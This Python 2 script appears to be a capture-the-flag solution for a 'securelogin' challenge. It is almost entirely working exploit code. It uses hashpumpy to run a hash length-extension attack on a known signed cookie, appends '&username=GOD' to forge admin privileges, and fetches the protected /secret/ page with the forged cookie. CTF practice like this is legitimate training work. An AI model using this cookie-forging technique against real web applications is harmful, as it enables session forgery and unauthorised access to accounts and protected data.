#!/usr/bin/env python
import urllib
import urllib2
import cookielib
from base64 import b64decode, b64encode
import hashpumpy
'''

#Author: Chad AKA lzlw
'''
def pump_hash(add):
    hexdigest = "4e4cd23864dadbe92508e28c30912f5f46ea550a073ac3e0164305fe6006b69d"
    original_data = "username=admin"
    data_to_add = add
    key_length = 32

    res =  hashpumpy.hashpump(hexdigest, original_data, data_to_add, key_length)
    cookie = res[1] + "-" + res[0]
    return cookie  
  
def get_token_cookie(username, password):
    cj = cookielib.CookieJar()
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
    base_url = 'http://securelogin.hackover.h4q.it/login/'
    post_values = {'username': username, 'password': password}
    post_data = urllib.urlencode(post_values)
    response = opener.open(base_url, post_data)
    for cookie in cj:
        token = b64decode(urllib.unquote(cookie.value))
        
    return token
def get_page(token):
    token = b64encode(token)
    cj = cookielib.CookieJar()
    base_url = 'http://securelogin.hackover.h4q.it/secret/'
    
    cookie = cookielib.Cookie(version=0, name='data', value=token, port=None, port_specified=False, domain='securelogin.hackover.h4q.it', domain_specified=False, domain_initial_dot=False, path='/', path_specified=True, secure=False, expires=None, discard=True, comment=None, comment_url=None, rest={'HttpOnly': None}, rfc2109=False)
    cj.set_cookie(cookie)
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
    response = opener.open(base_url)
        
    return response.read()
def main():
    #cookie = get_token_cookie("admin", "test")
    #print cookie
    cookie = pump_hash("&username=GOD")
    print get_page(cookie)
    pass
    
if __name__ == '__main__':
    main()
